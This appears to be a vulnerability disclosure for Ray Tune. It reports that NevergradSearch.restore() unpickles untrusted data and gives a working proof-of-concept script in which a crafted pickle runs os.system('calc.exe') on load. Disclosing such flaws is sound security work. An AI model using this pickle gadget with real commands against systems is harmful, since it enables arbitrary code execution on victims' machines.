# Description

`Ray` is an open source framework that provides a simple, universal API for building distributed applications. It is packaged with RLlib, a scalable reinforcement learning library, and Tune, a scalable hyperparameter tuning library. This package is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

`NevergradSearch` class uses `nevergrad` package to optimize hyperparameters. The `restore()` method is supposed to load objects saved with `save()` method. But lack of restriction allowes attacker constructed data to be unpickled.

# Proof of Concept

# Installation
```bash
pip install ray
pip install nevergrad
```

# Run exploit.py
```python
#!/usr/bin/env python3

import pickle
import os
import nevergrad
from ray.tune.suggest.nevergrad import NevergradSearch

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('calc.exe', ))

payload = pickle.dumps(EvilPickle())
optimizer = nevergrad.optimization.Optimizer(1)
ngSearch = NevergradSearch(optimizer)

with open('payload', 'wb') as f:
    f.write(payload)

ngSearch.restore('payload')
```
